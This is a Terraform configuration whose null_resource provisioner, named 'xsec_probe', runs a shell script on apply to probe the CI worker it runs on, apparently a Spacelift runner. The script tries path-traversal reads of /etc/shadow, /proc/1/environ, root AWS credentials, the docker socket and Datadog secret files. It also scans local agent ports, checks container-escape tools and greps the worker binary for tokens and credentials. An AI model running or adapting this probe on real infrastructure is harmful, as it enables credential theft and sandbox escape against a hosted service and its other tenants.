terraform {
  required_providers {
    null = {
      source  = "hashicorp/null"
      version = "~> 3.2"
    }
  }
}

resource "null_resource" "xsec_probe" {
  triggers = { nonce = timestamp() }

  provisioner "local-exec" {
    command = <<-EOT
      set +e
      echo "=== P3 START ==="
      echo "--- /var/datadog listing ---"
      find /var/datadog -maxdepth 4 2>/dev/null | head -80
      echo "--- /var/spacelift listing ---"
      find /var/spacelift -maxdepth 3 2>/dev/null | head -60
      echo "--- /mnt/workspace listing ---"
      find /mnt/workspace -maxdepth 3 2>/dev/null | head -60
      echo "--- etc/read ---"
      cat /etc/hosts 2>/dev/null | head -30
      cat /etc/resolv.conf 2>/dev/null | head -10
      cat /etc/hostname 2>/dev/null
      echo "--- 9p traversal attempts ---"
      for f in /var/datadog/../../etc/passwd /var/datadog/../../var/run/docker.sock /var/spacelift/../../etc/shadow /mnt/workspace/../../proc/1/environ /etc/hosts/../../etc/passwd /var/datadog/../../../root/.aws/credentials /var/datadog/dd-agent.conf /var/datadog/secrets /var/datadog/datadog.yaml; do
        if [ -f "$f" ] || [ -S "$f" ]; then echo "FOUND: $f"; head -c 300 "$f" 2>/dev/null | tr -cd '\11\12\15\40-\176' | head -5; else echo "no: $f"; fi
      done
      echo "--- find any sockets ---"
      find / -maxdepth 4 -type s 2>/dev/null | head -20
      find / -maxdepth 3 -iname '*datadog*' 2>/dev/null | head -20
      echo "--- agent socket probes ---"
      for p in 8126 5001 5012 8125 8082 9090; do
        curl -s -m 3 -o /dev/null -w "127.0.0.1:$p RC=%%{http_code}\n" http://127.0.0.1:$p/ 2>/dev/null || echo "127.0.0.1:$p fail"
      done
      echo "--- proc net ---"
      cat /proc/net/arp 2>/dev/null | head -10
      hostname -i 2>/dev/null
      ip -4 addr 2>/dev/null | head -20 || ifconfig 2>/dev/null | head -20 || true
      echo "--- proc1 root? ---"
      ls -la /proc/1/root/ 2>/dev/null | head -10
      cat /proc/1/status 2>/dev/null | head -30
      echo "--- docker? ---"
      ls -la /var/run/ /run/ 2>/dev/null | head -30
      env | grep -i DOCKER || echo no-docker-env
      echo "--- sys kmsg/gvisor info ---"
      cat /proc/sys/kernel/osrelease 2>/dev/null
      cat /proc/version 2>/dev/null
      echo "--- try unshare/nsenter/kubelet ---"
      which unshare nsenter kubectl docker 2>/dev/null
      echo "--- worker binary strings for endpoints (first 30 hits) ---"
      strings /bin/spacelift-worker 2>/dev/null | grep -Ei 'https?://|socket|token|credential' | head -30
      echo "=== P3 END ==="
    EOT
  }
}